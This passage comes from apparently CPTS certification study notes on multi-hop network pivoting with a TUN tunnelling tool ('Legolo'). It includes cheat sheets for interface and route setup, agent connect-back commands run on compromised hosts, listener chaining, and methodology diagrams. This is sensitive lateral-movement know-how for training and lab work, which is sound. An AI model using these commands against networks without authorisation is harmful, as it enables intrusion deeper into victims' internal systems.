### Step 6 — Find another network

```text
Pivot 2
   │
   ▼
172.16.6.0/24
```

### Step 7 — Extend the tunnel

```text
Kali
 ↓
Pivot 1
 ↓
Pivot 2
 ↓
172.16.6.0/24
```

### Step 8 — Repeat

```text
Pivot 3
   ↓
Pivot 4
   ↓
...
```

---

# 🧰 61. Important Commands — Cheat Sheet

## 🔹 Create TUN Interface

```bash
sudo ip tuntap add user kali mode tun legolo
```

## 🔹 Bring Interface Up

```bash
sudo ip link set legolo up
```

## 🔹 Check Interfaces

```bash
ifconfig
```

or:

```bash
ip addr
```

## 🔹 Check Routing Table

```bash
ip route
```

## 🔹 Add Internal Network Route

```bash
sudo ip route add 172.16.5.0/24 dev legolo
```

## 🔹 Second TUN Interface

```bash
sudo ip tuntap add user kali mode tun legolo-double
```

```bash
sudo ip link set legolo-double up
```

## 🔹 Second Network Route

```bash
sudo ip route add 172.16.6.0/24 dev legolo-double
```

## 🔹 Third TUN Interface

```bash
sudo ip tuntap add user kali mode tun legolo-triple
```

```bash
sudo ip link set legolo-triple up
```

## 🔹 Third Network Route

```bash
sudo ip route add 172.16.10.0/24 dev legolo-triple
```

---

# 🔌 62. Agent Connection Cheat Sheet

Generic structure:

```bash
./agent -connect <PROXY-IP>:11601 -ignore-cert
```

Windows:

```cmd
.\agent.exe -connect <PROXY-IP>:11601 -ignore-cert
```

Example from the first demonstration:

```cmd
.\agent.exe -connect 192.168.1.107:11601 -ignore-cert
```

Example through the first pivot:

```cmd
.\agent.exe -connect 172.16.5.15:11601 -ignore-cert
```

Example through the second pivot:

```cmd
.\agent.exe -connect 172.16.6.35:11601 -ignore-cert
```

---

# 🔌 63. Listener Cheat Sheet

The source demonstrates:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Then:

```text
listener_list
```

Purpose:

```text
New Pivot
    │
    ▼
Previous Pivot Listener
    │
    ▼
Existing Legolo Tunnel
    │
    ▼
Attack Box / Proxy
```

---

# 🎛️ 64. Legolo Session Workflow

After agents connect:

```text
session
```

Select the appropriate agent.

Then use commands such as:

```text
help
```

and:

```text
start --tun <interface>
```

For example:

```text
start --tun legolo
```

or:

```text
start --tun legolo-double
```

or:

```text
start --tun legolo-triple
```

---

# 📊 65. Complete Example — First Pivot

```text
ATTACK BOX
192.168.1.107
      │
      │ :11601
      ▼
WINDOWS FOOTHOLD
192.168.1.105
      │
      ▼
169.254.62.0/24
      │
      ▼
169.254.62.20
```

Commands/concepts:

```text
1. Start Legolo proxy
2. Transfer Windows agent
3. Run agent
4. Agent connects to :11601
5. Select session
6. Auto-route internal network
7. Create TUN interface
8. Route traffic through tunnel
9. Ping internal host
10. Enumerate internal network
```

---

# 📊 66. Complete Example — Double Pivot

```text
ATTACK BOX
     │
     │ Legolo
     ▼
PIVOT 1
172.16.5.15
     │
     │ Listener :11601
     ▼
PIVOT 2
172.16.5.35
     │
     ▼
172.16.6.0/24
```

Attack-box interfaces:

```text
legolo
legolo-double
```

Routes:

```text
172.16.5.0/24 → legolo
172.16.6.0/24 → legolo-double
```

---

# 📊 67. Complete Example — Triple Pivot

```text
ATTACK BOX
     │
     ▼
PIVOT 1
     │
     ▼
PIVOT 2
     │
     ▼
PIVOT 3
     │
     ▼
172.16.10.0/24
```

Attack-box interfaces:

```text
legolo
legolo-double
legolo-triple
```

Routes:

```text
172.16.5.0/24  → legolo
172.16.6.0/24  → legolo-double
172.16.10.0/24 → legolo-triple
```

---

# ⚠️ 68. Technical Accuracy Notes

> [!warning]  
> **1. Version-specific commands**
> 
> Legolo's command syntax and binary names can differ between releases. The source material uses a particular version and terminology. When working with another version, always verify:
> 
> ```text
> help
> ```
> 
> and the release documentation.

> [!warning]  
> **2. Interface names**
> 
> The examples use names such as:
> 
> ```text
> legolo
> legolo-double
> legolo-triple
> ```
> 
> These are naming conventions chosen by the author. They are not magical interface names. You can choose appropriate names for your environment.

> [!warning]  
> **3. `-ignore-cert`**
> 
> This is used because the demonstration creates a self-signed certificate. In a real environment, certificate validation should not simply be disabled without understanding the security implications.

> [!warning]  
> **4. Ping is only a connectivity test**
> 
> Successful ICMP does not prove that every service is reachable. A firewall may permit ICMP but block TCP/UDP services, or vice versa.
> 
> Therefore:
> 
> ```text
> Ping works
>      ≠
> Everything works
> ```
> 
> Service enumeration is still required.

> [!warning]  
> **5. Routing must match the network**
> 
> Do not blindly add:
> 
> ```bash
> sudo ip route add 172.16.5.0/24 dev legolo
> ```
> 
> unless the selected pivot actually has access to that network and the tunnel is configured to carry it.

---

# 🧠 69. Why Legolo Can Be Easier Than ProxyChains

Traditional proxy-based pivoting often looks like:

```text
Tool
 │
 ▼
ProxyChains
 │
 ▼
SOCKS Proxy
 │
 ▼
Pivot
 │
 ▼
Target
```

With a TUN-based solution:

```text
Tool
 │
 ▼
Linux Routing Table
 │
 ▼
TUN Interface
 │
 ▼
Legolo
 │
 ▼
Pivot
 │
 ▼
Target
```

The major conceptual difference:

```text
SOCKS / ProxyChains
        ↓
Application-aware proxying

TUN
        ↓
Network-layer routing
```

> [!important]  
> This does **not** mean TUN automatically solves every protocol or routing problem. It means the attacker can route IP traffic through the virtual interface rather than manually configuring every individual application to use a proxy.

---

# 🧠 70. Pivoting vs Port Forwarding

These concepts are related but should not be confused.

### Port Forwarding

```text
Kali
 │
 ▼
Pivot
 │
 ▼
Specific service
```

Example concept:

```text
Kali:8080
    ↓
Pivot:8080
    ↓
Internal Web Server:80
```

### Network Pivoting

```text
Kali
 │
 ▼
TUN Interface
 │
 ▼
Pivot
 │
 ▼
Entire Internal Network
```

Therefore:

```text
Port Forwarding
     =
Specific connection/service

Network Pivot
     =
Route traffic to a network
```

---

# 🧠 71. The CPTS "What Do I Do Next?" Model

When you obtain a foothold:

```text
                    ┌───────────────┐
                    │ Initial Shell │
                    └───────┬───────┘
                            │
                            ▼
                  Enumerate Network
                            │
             ┌──────────────┴──────────────┐
             │                             │
             ▼                             ▼
       Same Network                 New Network Found
             │                             │
             ▼                             ▼
       Enumerate Hosts               Set Up Pivot
                                           │
                                           ▼
                                    Enumerate Hosts
                                           │
                                           ▼
                                    Find Credentials
                                           │
                                           ▼
                                    Gain New Host
                                           │
                                           ▼
                                  Enumerate Interfaces
                                           │
                                           ▼
                                  Another Network?
                                      │       │
                                     NO      YES
                                      │       │
                                      ▼       ▼
                                  Continue   Pivot Again
```

This is the methodology behind the demonstrations.

The commands are simply implementation details of this larger decision process.

---

# 🧠 72. Strong Mental Model — "Reachability Expansion"

The easiest way to remember pivoting:

> **A compromised host expands your reachable network.**

Initially:

```text
Kali can reach:

[Network A]
```

After compromising Host A:

```text
Kali
  │
  ▼
Host A
  │
  ├── Network A
  └── Network B
```

After compromising Host B:

```text
Kali
  │
  ▼
Host A
  │
  ▼
Host B
  │
  └── Network C
```

After compromising Host C:

```text
Kali
  │
  ▼
Host A
  │
  ▼
Host B
  │
  ▼
Host C
  │
  └── Network D
```

Every new host potentially expands the attack surface.

---

# 🧠 73. The "Interface → Route → Tunnel → Pivot" Formula

For CPTS, remember:

```text
🌐 INTERFACE
      ↓
🛣️ ROUTE
      ↓
🕳️ TUNNEL
      ↓
🖥️ PIVOT
      ↓
🎯 INTERNAL TARGET
```

### Interface

Creates the local entry point:

```bash
sudo ip tuntap add ...
```

### Route

Tells Kali which destination should use the interface:

```bash
sudo ip route add <NETWORK> dev <INTERFACE>
```

### Tunnel

Connects the interface to the compromised host:

```text
Legolo
```

### Pivot

The compromised host forwards/reaches the internal network.

---

# 🔥 74. Most Important CPTS Takeaways

> [!success]
> 
> ### 🧠 Remember These
> 
> **1. Pivoting = using a compromised host as a stepping stone.**
> 
> **2. The reason to pivot is usually network reachability.**
> 
> **3. Always inspect network interfaces after obtaining a foothold.**
> 
> **4. A second network interface on a compromised host is a strong pivoting clue.**
> 
> **5. Legolo uses an agent + proxy architecture.**
> 
> **6. The agent runs on the compromised host.**
> 
> **7. The proxy runs on the attack machine.**
> 
> **8. A TUN interface allows Kali to route traffic through the tunnel.**
> 
> **9. Routes determine which destinations use the tunnel.**
> 
> **10. Once the tunnel works, enumerate the newly reachable network.**
> 
> **11. If another compromised host exposes another network, that host can become the next pivot.**
> 
> **12. Multi-pivoting requires chaining the connection through listeners on previous pivots.**
> 
> **13. Each additional pivot can have its own TUN interface and route.**
> 
> **14. The process can be repeated multiple times.**
> 
> **15. Pivoting is part of a feedback loop, not a one-time action.**

---

# 🧠 75. Final CPTS Mental Model

```text
                🎯 INITIAL FOOTHOLD
                        │
                        ▼
              🌐 ENUMERATE INTERFACES
                        │
                        ▼
              🔎 DISCOVER NEW NETWORK
                        │
                        ▼
                🕳️ ESTABLISH TUNNEL
                        │
                        ▼
                 🛣️ ADD ROUTE
                        │
                        ▼
                📡 TEST CONNECTIVITY
                        │
                        ▼
             🔎 ENUMERATE NEW NETWORK
                        │
                        ▼
                🎯 COMPROMISE HOST
                        │
                        ▼
              🌐 ENUMERATE INTERFACES
                        │
                        ▼
              ❓ NEW NETWORK?
                    /       \
                  NO         YES
                  │           │
                  ▼           ▼
              CONTINUE     NEW PIVOT
                              │
                              ▼
                         NEW LISTENER
                              │
                              ▼
                          NEW AGENT
                              │
                              ▼
                         NEW TUNNEL
                              │
                              ▼
                          NEW ROUTE
                              │
                              ▼
                    🔁 REPEAT PROCESS
```

> [!tip]  
> **The key CPTS skill is not memorizing `Legolo`.**
> 
> The skill is recognizing the situation:
> 
> **"This compromised host can reach something that I cannot."**
> 
> From there:
> 
> ```text
> Compromised Host
>        ↓
> Hidden Network
>        ↓
> Pivot
>        ↓
> Route
>        ↓
> Enumeration
>        ↓
> New Host
>        ↓
> New Network
>        ↓
> Pivot Again
> ```
> 
> Legolo is simply one tool that makes this network-extension process easier by providing a TUN-based tunnel and allowing the attack machine to route traffic through one or multiple compromised hosts.